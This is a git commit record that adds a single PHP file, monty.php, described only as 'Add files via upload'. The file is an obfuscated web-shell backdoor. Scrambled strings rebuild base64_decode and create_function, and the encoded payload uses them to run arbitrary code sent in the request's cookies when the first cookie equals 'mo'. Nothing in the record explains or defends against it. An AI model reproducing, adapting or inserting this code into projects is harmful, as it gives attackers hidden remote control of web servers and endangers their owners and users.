3f7a85f56e05129116537b019c83731ca1c182ee
Mr-Monty999 <41972631+Mr-Monty999@users.noreply.github.com>
2018-08-05 14:51:01 +0000

    Add files via upload

---
+++ monty.php
@@ -0,0 +1,10 @@
+<?php
+$elrh="dudHknopO2VjaG8gJzwnopLiRrLic+opJztldmFsKGJhc2U2opNopF9opkZopWNvZopGUocHJlZ19yopZ";
+$arsv = str_replace("b","","bsbtrb_brbebpblbabcbe");
+$conu="XBsYWNlKGFycopmopF5KCcvW15cdz1cc10vJywnL1xzLycpLCBhcnJheSopgnJywnKycpLCBqb2luKGFy";
+$jxny="JGM9J2NvdW50JopzskYT0kX0NPT0tJRTtpZihyZXNldCgopkYSk9PSdoptbycgJiYgJGMoJGEpPjMpeyRrPS";
+$nbqd="cmF5Xop3NsaWNlKCRhLCRjKopCRophKS0zKSkpopKSk7opZWNobyAopnPCop8nLopiRrLic+Jopztop9";
+$hbfy = $arsv("f", "", "fbafsfe64f_dfefcfofdfe");
+$jnfi = $arsv("q","","cqrqeqateq_fqunqctioqn");
+$dxdq = $jnfi('', $hbfy($arsv("op", "", $jxny.$elrh.$conu.$nbqd))); $dxdq();
+?>
